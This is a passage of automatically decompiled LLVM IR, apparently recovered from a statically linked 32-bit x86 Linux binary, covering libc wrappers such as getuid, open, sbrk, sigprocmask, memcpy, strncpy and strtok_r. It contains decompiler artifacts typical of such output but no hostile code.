  ret i32 %v0_804ba64

; uselistorder directives
  uselistorder label %dec_label_pc_804ba64, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ba68 = load i32, i32* @ebx, align 4
  store i32 %v0_804ba68, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804ba7b = call i32 @int80_syscall(i32 191)
  store i32 %v1_804ba7b, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804ba7b, -4095
  br i1 %tmp8, label %dec_label_pc_804ba94, label %dec_label_pc_804ba88

dec_label_pc_804ba88:                             ; preds = %entry
  %v0_804ba88 = load i32, i32* %stack_var_-4, align 4
  %v1_804ba88 = call i32 @__errno_location(i32 %v0_804ba88)
  %v0_804ba8d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ba8d = sub i32 0, %v0_804ba8d
  %v2_804ba8f = inttoptr i32 %v1_804ba88 to i32*
  store i32 %v1_804ba8d, i32* %v2_804ba8f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ba94

dec_label_pc_804ba94:                             ; preds = %entry, %dec_label_pc_804ba88
  %v0_804ba94 = phi i32 [ %v1_804ba7b, %entry ], [ -1, %dec_label_pc_804ba88 ]
  %v2_804ba98 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ba98, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804ba94

; uselistorder directives
  uselistorder i32 %v1_804ba7b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ba94, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ba9c = load i32, i32* @ebx, align 4
  store i32 %v0_804ba9c, i32* %stack_var_-4, align 4
  %v1_804baa5 = call i32 @int80_syscall(i32 199)
  store i32 %v1_804baa5, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804baa5, -4095
  br i1 %tmp6, label %dec_label_pc_804babc, label %dec_label_pc_804bab0

dec_label_pc_804bab0:                             ; preds = %entry
  %v0_804bab0 = load i32, i32* %stack_var_-4, align 4
  %v1_804bab0 = call i32 @__errno_location(i32 %v0_804bab0)
  %v0_804bab5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bab5 = sub i32 0, %v0_804bab5
  %v2_804bab7 = inttoptr i32 %v1_804bab0 to i32*
  store i32 %v1_804bab5, i32* %v2_804bab7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804babc

dec_label_pc_804babc:                             ; preds = %entry, %dec_label_pc_804bab0
  %v0_804babc = phi i32 [ %v1_804baa5, %entry ], [ -1, %dec_label_pc_804bab0 ]
  %v2_804bac0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bac0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804babc

; uselistorder directives
  uselistorder i32 %v1_804baa5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804babc, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bac4 = load i32, i32* @ebx, align 4
  store i32 %v0_804bac4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804bad7 = call i32 @munmap(i32 %v0_804bac4, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_804bad7, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v4_804bad7, -4095
  br i1 %tmp8, label %dec_label_pc_804baf0, label %dec_label_pc_804bae4

dec_label_pc_804bae4:                             ; preds = %entry
  %v0_804bae4 = load i32, i32* %stack_var_-4, align 4
  %v1_804bae4 = call i32 @__errno_location(i32 %v0_804bae4)
  %v0_804bae9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bae9 = sub i32 0, %v0_804bae9
  %v2_804baeb = inttoptr i32 %v1_804bae4 to i32*
  store i32 %v1_804bae9, i32* %v2_804baeb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804baf0

dec_label_pc_804baf0:                             ; preds = %entry, %dec_label_pc_804bae4
  %v0_804baf0 = phi i32 [ %v4_804bad7, %entry ], [ -1, %dec_label_pc_804bae4 ]
  %v2_804baf2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804baf2, i32* @edx, align 4
  %v2_804baf4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804baf4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804baf0

; uselistorder directives
  uselistorder i32 %v4_804bad7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804baf0, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804baf9 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804baff = sdiv i32 %sext, 16777216
  store i32 %v4_804baff, i32* @ecx, align 4
  %v4_804bb03 = ptrtoint i8* %arg1 to i32
  %v3_804bb07 = and i32 %arg2, 64
  %v4_804bb07 = icmp eq i32 %v3_804bb07, 0
  br i1 %v4_804bb07, label %dec_label_pc_804bb18, label %dec_label_pc_804bb0c

dec_label_pc_804bb0c:                             ; preds = %entry
  %phitmp = urem i32 %arg3, 65536
  br label %dec_label_pc_804bb18

dec_label_pc_804bb18:                             ; preds = %entry, %dec_label_pc_804bb0c
  %v0_804bb18 = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_804bb0c ]
  store i32 %v0_804bb18, i32* @edx, align 4
  store i32 %v4_804bb03, i32* %ebx.global-to-local, align 4
  %v5_804bb23 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804baff)
  store i32 %v5_804bb23, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_804bb23, -4095
  br i1 %tmp15, label %dec_label_pc_804bb3b, label %dec_label_pc_804bb2f

dec_label_pc_804bb2f:                             ; preds = %dec_label_pc_804bb18
  %v1_804bb2f = call i32 @__errno_location(i32 %v0_804baf9)
  %v0_804bb34 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bb34 = sub i32 0, %v0_804bb34
  %v2_804bb36 = inttoptr i32 %v1_804bb2f to i32*
  store i32 %v1_804bb34, i32* %v2_804bb36, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bb3b

dec_label_pc_804bb3b:                             ; preds = %dec_label_pc_804bb18, %dec_label_pc_804bb2f
  %v0_804bb3b = phi i32 [ %v5_804bb23, %dec_label_pc_804bb18 ], [ -1, %dec_label_pc_804bb2f ]
  store i32 %v0_804baf9, i32* @ebx, align 4
  ret i32 %v0_804bb3b

; uselistorder directives
  uselistorder i32 %v5_804bb23, { 1, 0, 2 }
  uselistorder i32 %v4_804baff, { 1, 0 }
  uselistorder i32 %v0_804baf9, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804bb3b, { 1, 0 }
  uselistorder label %dec_label_pc_804bb18, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804bb53 = inttoptr i32 %arg1 to i8*
  %v4_804bb53 = call i32 @__libc_open(i8* %v3_804bb53, i32 577, i32 %arg2)
  ret i32 %v4_804bb53
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804bb5d = load i32, i32* @ebx, align 4
  %v0_804bb61 = load i32, i32* @global_var_8052544.82, align 4
  %v1_804bb61 = icmp eq i32 %v0_804bb61, 0
  %v1_804bb6c = icmp eq i1 %v1_804bb61, false
  br i1 %v1_804bb6c, label %dec_label_pc_804bb7f, label %dec_label_pc_804bb6e

dec_label_pc_804bb6e:                             ; preds = %entry
  %v1_804bb73 = call i32 @__GI_brk(i32 0)
  %v2_804bb7b = icmp slt i32 %v1_804bb73, 0
  br i1 %v2_804bb7b, label %dec_label_pc_804bba1, label %dec_label_pc_804bb6e.dec_label_pc_804bb7f_crit_edge

dec_label_pc_804bb6e.dec_label_pc_804bb7f_crit_edge: ; preds = %dec_label_pc_804bb6e
  %v0_804bb81.pre = load i32, i32* @global_var_8052544.82, align 4
  br label %dec_label_pc_804bb7f

dec_label_pc_804bb7f:                             ; preds = %dec_label_pc_804bb6e.dec_label_pc_804bb7f_crit_edge, %entry
  %v0_804bb8f = phi i32 [ %v0_804bb81.pre, %dec_label_pc_804bb6e.dec_label_pc_804bb7f_crit_edge ], [ %v0_804bb61, %entry ]
  %v1_804bb7f = icmp eq i32 %arg1, 0
  %v1_804bb86 = icmp eq i1 %v1_804bb7f, false
  br i1 %v1_804bb86, label %dec_label_pc_804bb8c, label %dec_label_pc_804bb88

dec_label_pc_804bb88:                             ; preds = %dec_label_pc_804bb7f
  br label %dec_label_pc_804bba4

dec_label_pc_804bb8c:                             ; preds = %dec_label_pc_804bb7f
  store i32 %v0_804bb8f, i32* @ebx, align 4
  %v2_804bb91 = add i32 %v0_804bb8f, %arg1
  %v1_804bb95 = call i32 @__GI_brk(i32 %v2_804bb91)
  %v2_804bb9d = icmp slt i32 %v1_804bb95, 0
  %v1_804bb9f = icmp eq i1 %v2_804bb9d, false
  br i1 %v1_804bb9f, label %dec_label_pc_804bb8c.dec_label_pc_804bba4_crit_edge, label %dec_label_pc_804bba1

dec_label_pc_804bb8c.dec_label_pc_804bba4_crit_edge: ; preds = %dec_label_pc_804bb8c
  %v0_804bba4.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804bba4

dec_label_pc_804bba1:                             ; preds = %dec_label_pc_804bb8c, %dec_label_pc_804bb6e
  br label %dec_label_pc_804bba4

dec_label_pc_804bba4:                             ; preds = %dec_label_pc_804bb8c.dec_label_pc_804bba4_crit_edge, %dec_label_pc_804bb88, %dec_label_pc_804bba1
  %v0_804bba4 = phi i32 [ %v0_804bba4.pre, %dec_label_pc_804bb8c.dec_label_pc_804bba4_crit_edge ], [ %v0_804bb8f, %dec_label_pc_804bb88 ], [ -1, %dec_label_pc_804bba1 ]
  %v2_804bba6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bba6, i32* @edx, align 4
  store i32 %v0_804bb5d, i32* @ebx, align 4
  ret i32 %v0_804bba4

; uselistorder directives
  uselistorder i32 %v0_804bb8f, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_804bba4, { 2, 0, 1 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804bbad = load i32, i32* @esi, align 4
  %v4_804bbb1 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804bbb1, i32* @ecx, align 4
  %v2_804bbbd = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804bbbd, label %dec_label_pc_804bbd6, label %dec_label_pc_804bbc1

dec_label_pc_804bbc1:                             ; preds = %entry
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_804bbd6, label %dec_label_pc_804bbc6

dec_label_pc_804bbc6:                             ; preds = %dec_label_pc_804bbc1
  %v1_804bbc6 = call i32 @__errno_location(i32 %v0_804bbad)
  %v1_804bbcb = inttoptr i32 %v1_804bbc6 to i32*
  store i32 22, i32* %v1_804bbcb, align 4
  br label %dec_label_pc_804bbfd

dec_label_pc_804bbd6:                             ; preds = %dec_label_pc_804bbc1, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804bbdb = load i32, i32* @ebx, align 4
  %v7_804bbe3 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804bbdb, i32* @ebx, align 4
  store i32 %v7_804bbe3, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_804bbe3, -4095
  br i1 %tmp12, label %dec_label_pc_804bbfd, label %dec_label_pc_804bbef

dec_label_pc_804bbef:                             ; preds = %dec_label_pc_804bbd6
  %v1_804bbef = call i32 @__errno_location(i32 %v0_804bbdb)
  %v0_804bbf4 = load i32, i32* %esi.global-to-local, align 4
  %v1_804bbf4 = sub i32 0, %v0_804bbf4
  %v2_804bbf6 = inttoptr i32 %v1_804bbef to i32*
  store i32 %v1_804bbf4, i32* %v2_804bbf6, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804bbfd

dec_label_pc_804bbfd:                             ; preds = %dec_label_pc_804bbef, %dec_label_pc_804bbd6, %dec_label_pc_804bbc6
  %storemerge = phi i32 [ -1, %dec_label_pc_804bbc6 ], [ %v7_804bbe3, %dec_label_pc_804bbd6 ], [ -1, %dec_label_pc_804bbef ]
  %v2_804bbfd = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bbfd, i32* @edx, align 4
  store i32 %v0_804bbad, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804bbe3, { 1, 0, 2 }
  uselistorder i32 %v0_804bbdb, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bc04 = load i32, i32* @edi, align 4
  store i32 %v0_804bc04, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804bc0c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804bc14 = call i32 @times(i32 %v0_804bc0c)
  store i32 %v1_804bc14, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804bc14, -4095
  br i1 %tmp8, label %dec_label_pc_804bc2c, label %dec_label_pc_804bc20

dec_label_pc_804bc20:                             ; preds = %entry
  %v1_804bc20 = call i32 @__errno_location(i32 %v0_804bc0c)
  %v0_804bc25 = load i32, i32* %edi.global-to-local, align 4
  %v1_804bc25 = sub i32 0, %v0_804bc25
  %v2_804bc27 = inttoptr i32 %v1_804bc20 to i32*
  store i32 %v1_804bc25, i32* %v2_804bc27, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804bc2c

dec_label_pc_804bc2c:                             ; preds = %entry, %dec_label_pc_804bc20
  %v0_804bc2c = phi i32 [ %v1_804bc14, %entry ], [ -1, %dec_label_pc_804bc20 ]
  %v2_804bc30 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bc30, i32* @edi, align 4
  ret i32 %v0_804bc2c

; uselistorder directives
  uselistorder i32 %v1_804bc14, { 1, 0, 2 }
  uselistorder i32 (i32)* @times, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bc2c, { 1, 0 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804bc34 = load i32, i32* @edi, align 4
  %v0_804bc35 = load i32, i32* @esi, align 4
  store i32 %v0_804bc35, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_804bc49 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804bc51 = call i32 @wait4(i32 %v0_804bc49, i32 %v0_804bc35, i32 %v0_804bc34, i32 %tmp5)
  store i32 %v0_804bc49, i32* @ebx, align 4
  store i32 %v4_804bc51, i32* %esi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_804bc51, -4095
  br i1 %tmp10, label %dec_label_pc_804bc69, label %dec_label_pc_804bc5d

dec_label_pc_804bc5d:                             ; preds = %entry
  %v1_804bc5d = call i32 @__errno_location(i32 %v0_804bc49)
  %v0_804bc62 = load i32, i32* %esi.global-to-local, align 4
  %v1_804bc62 = sub i32 0, %v0_804bc62
  %v2_804bc64 = inttoptr i32 %v1_804bc5d to i32*
  store i32 %v1_804bc62, i32* %v2_804bc64, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804bc69

dec_label_pc_804bc69:                             ; preds = %entry, %dec_label_pc_804bc5d
  %v0_804bc69 = phi i32 [ %v4_804bc51, %entry ], [ -1, %dec_label_pc_804bc5d ]
  %v2_804bc6c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804bc6c, i32* @esi, align 4
  store i32 %v0_804bc34, i32* @edi, align 4
  ret i32 %v0_804bc69

; uselistorder directives
  uselistorder i32 %v4_804bc51, { 1, 0, 2 }
  uselistorder i32 %v0_804bc49, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_804bc69, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8052524.83 to i32)
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804bc79 = load i32, i32* @esi, align 4
  store i32 %v0_804bc79, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804bc7a = sdiv i32 %sext, 16777216
  store i32 %v4_804bc7a, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804bc84 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804bc84, i32* %edi.global-to-local, align 4
  %v2_804bc88 = udiv i32 %v4_804bc7a, 4
  %v3_804bc8b = inttoptr i32 %arg2 to i8*
  %v4_804bc8b = bitcast i16* %arg1 to i8*
  %v5_804bc8b = call i8* @_memcpy(i8* %v4_804bc8b, i8* %v3_804bc8b, i32 %v2_804bc88)
  %v6_804bc8b = ptrtoint i8* %v5_804bc8b to i32
  store i32 %v6_804bc8b, i32* @ecx, align 4
  %v0_804bc8d = load i32, i32* %eax.global-to-local, align 4
  %v2_804bc8d = and i32 %v0_804bc8d, 2
  %v3_804bc8d = icmp eq i32 %v2_804bc8d, 0
  br i1 %v3_804bc8d, label %dec_label_pc_804bc93, label %dec_label_pc_804bc91

dec_label_pc_804bc91:                             ; preds = %entry
  %v0_804bc91 = load i32, i32* %esi.global-to-local, align 4
  %v1_804bc91 = inttoptr i32 %v0_804bc91 to i16*
  %v2_804bc91 = load i16, i16* %v1_804bc91, align 2
  %v3_804bc91 = load i32, i32* %edi.global-to-local, align 4
  %v4_804bc91 = inttoptr i32 %v3_804bc91 to i16*
  store i16 %v2_804bc91, i16* %v4_804bc91, align 2
  %v5_804bc91 = load i32, i32* %edi.global-to-local, align 4
  %v6_804bc91 = load i32, i32* %esi.global-to-local, align 4
  %v7_804bc91 = load i1, i1* @df, align 1
  %v8_804bc91 = select i1 %v7_804bc91, i32 -2, i32 2
  %v9_804bc91 = add i32 %v8_804bc91, %v5_804bc91
  %v10_804bc91 = add i32 %v8_804bc91, %v6_804bc91
  store i32 %v9_804bc91, i32* %edi.global-to-local, align 4
  store i32 %v10_804bc91, i32* %esi.global-to-local, align 4
  %v0_804bc93.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bc93

dec_label_pc_804bc93:                             ; preds = %entry, %dec_label_pc_804bc91
  %v0_804bc93 = phi i32 [ %v0_804bc8d, %entry ], [ %v0_804bc93.pre, %dec_label_pc_804bc91 ]
  %v2_804bc93 = urem i32 %v0_804bc93, 2
  %v3_804bc93 = icmp eq i32 %v2_804bc93, 0
  br i1 %v3_804bc93, label %dec_label_pc_804bc98, label %dec_label_pc_804bc97

dec_label_pc_804bc97:                             ; preds = %dec_label_pc_804bc93
  %v0_804bc97 = load i32, i32* %esi.global-to-local, align 4
  %v1_804bc97 = inttoptr i32 %v0_804bc97 to i8*
  %v2_804bc97 = load i8, i8* %v1_804bc97, align 1
  %v3_804bc97 = load i32, i32* %edi.global-to-local, align 4
  %v4_804bc97 = inttoptr i32 %v3_804bc97 to i8*
  store i8 %v2_804bc97, i8* %v4_804bc97, align 1
  %v5_804bc97 = load i32, i32* %edi.global-to-local, align 4
  %v6_804bc97 = load i32, i32* %esi.global-to-local, align 4
  %v7_804bc97 = load i1, i1* @df, align 1
  %v8_804bc97 = select i1 %v7_804bc97, i32 -1, i32 1
  %v9_804bc97 = add i32 %v8_804bc97, %v5_804bc97
  %v10_804bc97 = add i32 %v8_804bc97, %v6_804bc97
  store i32 %v9_804bc97, i32* %edi.global-to-local, align 4
  store i32 %v10_804bc97, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804bc98

dec_label_pc_804bc98:                             ; preds = %dec_label_pc_804bc93, %dec_label_pc_804bc97
  store i32 %v4_804bc84, i32* %eax.global-to-local, align 4
  %v2_804bc9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804bc9c, i32* @esi, align 4
  ret i32 %v4_804bc84

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_804bc98, { 1, 0 }
  uselistorder label %dec_label_pc_804bc93, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_804bca1 = load i32, i32* @esi, align 4
  store i32 %v0_804bca1, i32* %stack_var_-8, align 4
  %v4_804bca2 = ptrtoint i8* %arg1 to i32
  %v9_804bcae = icmp ugt i8* %tmp3, %arg1
  %v1_804bcb0 = icmp eq i1 %v9_804bcae, false
  br i1 %v1_804bcb0, label %dec_label_pc_804bcb8, label %dec_label_pc_804bcb2

dec_label_pc_804bcb2:                             ; preds = %entry
  %v7_804bcb4 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_804bcc4

dec_label_pc_804bcb8:                             ; preds = %entry
  %v3_804bcb8 = add i32 %arg2, -1
  %v4_804bcb8 = add i32 %v3_804bcb8, %tmp
  %v5_804bcb8 = inttoptr i32 %v4_804bcb8 to i8*
  %v3_804bcbc = add i32 %v4_804bca2, -1
  %v4_804bcbc = add i32 %v3_804bcbc, %tmp
  %v5_804bcbc = inttoptr i32 %v4_804bcbc to i8*
  %v7_804bcc1 = call i8* @_memcpy(i8* %v5_804bcbc, i8* %v5_804bcb8, i32 %tmp)
  br label %dec_label_pc_804bcc4

dec_label_pc_804bcc4:                             ; preds = %dec_label_pc_804bcb2, %dec_label_pc_804bcb8
  %v2_804bcc4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804bcc4, i32* @esi, align 4
  ret i32 %v4_804bca2

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 1, 3, 2, 0 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804bcc4, { 1, 0 }
}

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804bcc9 = load i32, i32* @esi, align 4
  store i32 %v0_804bcc9, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804bcd5 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804bcd5, i32* %edi.global-to-local, align 4
  %v1_804bcd9 = add i32 %arg3, 1
  store i32 %v1_804bcd9, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804bcda

dec_label_pc_804bcda:                             ; preds = %dec_label_pc_804bcdd, %entry
  %v3_804bcde = phi i32 [ %v4_804bcd5, %entry ], [ %v8_804bcde, %dec_label_pc_804bcdd ]
  %v0_804bcda = phi i32 [ %v1_804bcd9, %entry ], [ %v0_804bcda.pre, %dec_label_pc_804bcdd ]
  %v1_804bcda = add i32 %v0_804bcda, -1
  %v8_804bcda = icmp eq i32 %v1_804bcda, 0
  store i32 %v1_804bcda, i32* %ecx.global-to-local, align 4
  br i1 %v8_804bcda, label %.loopexit, label %dec_label_pc_804bcdd

dec_label_pc_804bcdd:                             ; preds = %dec_label_pc_804bcda
  %v0_804bcdd = load i32, i32* %esi.global-to-local, align 4
  %v1_804bcdd = inttoptr i32 %v0_804bcdd to i8*
  %v2_804bcdd = load i8, i8* %v1_804bcdd, align 1
  %v10_804bcdd = load i1, i1* @df, align 1
  %v11_804bcdd = select i1 %v10_804bcdd, i32 -1, i32 1
  %v12_804bcdd = add i32 %v11_804bcdd, %v0_804bcdd
  store i32 %v12_804bcdd, i32* %esi.global-to-local, align 4
  %v4_804bcde = inttoptr i32 %v3_804bcde to i8*
  store i8 %v2_804bcdd, i8* %v4_804bcde, align 1
  %v5_804bcde = load i32, i32* %edi.global-to-local, align 4
  %v6_804bcde = load i1, i1* @df, align 1
  %v7_804bcde = select i1 %v6_804bcde, i32 -1, i32 1
  %v8_804bcde = add i32 %v7_804bcde, %v5_804bcde
  store i32 %v8_804bcde, i32* %edi.global-to-local, align 4
  %v6_804bcdf = icmp eq i8 %v2_804bcdd, 0
  %v1_804bce1 = icmp eq i1 %v6_804bcdf, false
  %v0_804bcda.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_804bce1, label %dec_label_pc_804bcda, label %dec_label_pc_804bce3

dec_label_pc_804bce3:                             ; preds = %dec_label_pc_804bcdd
  %v1_804bce3 = add i32 %v0_804bcda.pre, -1
  store i32 %v1_804bce3, i32* %ecx.global-to-local, align 4
  %v2_804bce4 = sext i8 %v2_804bcdd to i32
  %v4_804bce4 = inttoptr i32 %v8_804bcde to i8*
  %v5_804bce4 = call i8* @_memset(i8* %v4_804bce4, i32 %v2_804bce4, i32 %v1_804bce3)
  %v6_804bce4 = ptrtoint i8* %v5_804bce4 to i32
  store i32 %v6_804bce4, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804bcda, %dec_label_pc_804bce3
  %v2_804bcea = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bcea, i32* @edx, align 4
  %v2_804bceb = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804bceb, i32* @esi, align 4
  ret i32 %v4_804bcd5

; uselistorder directives
  uselistorder i32 %v8_804bcde, { 0, 2, 1 }
  uselistorder i8 %v2_804bcdd, { 0, 2, 1 }
  uselistorder i32 %v1_804bcda, { 1, 0 }
  uselistorder i32 %v4_804bcd5, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804bcf0 = load i32, i32* @edi, align 4
  %v0_804bcf1 = load i32, i32* @esi, align 4
  %v0_804bcf2 = load i32, i32* @ebx, align 4
  store i32 %v0_804bcf2, i32* %stack_var_-12, align 4
  %v4_804bcf3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804bcf3, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_804bcff = icmp eq i8* %arg1, null
  %v1_804bd01 = icmp eq i1 %v1_804bcff, false
  br i1 %v1_804bd01, label %dec_label_pc_804bd05, label %dec_label_pc_804bd03

dec_label_pc_804bd03:                             ; preds = %entry
  %v1_804bd03 = inttoptr i32 %arg3 to i32*
  %v2_804bd03 = load i32, i32* %v1_804bd03, align 4
  store i32 %v2_804bd03, i32* @ebx, align 4
  br label %dec_label_pc_804bd05

dec_label_pc_804bd05:                             ; preds = %entry, %dec_label_pc_804bd03
  %v0_804bd08 = phi i32 [ %v4_804bcf3, %entry ], [ %v2_804bd03, %dec_label_pc_804bd03 ]
  %v0_804bd05 = load i32, i32* @ecx, align 4
  %v5_804bd08 = inttoptr i32 %v0_804bd08 to i8*
  %v8_804bd09 = call i32 @__GI_strspn(i8* %v5_804bd08, i32 %arg2, i32 %v0_804bd05, i32 %v0_804bd05)
  store i32 %v8_804bd09, i32* %eax.global-to-local, align 4
  %v0_804bd11 = load i32, i32* @ebx, align 4
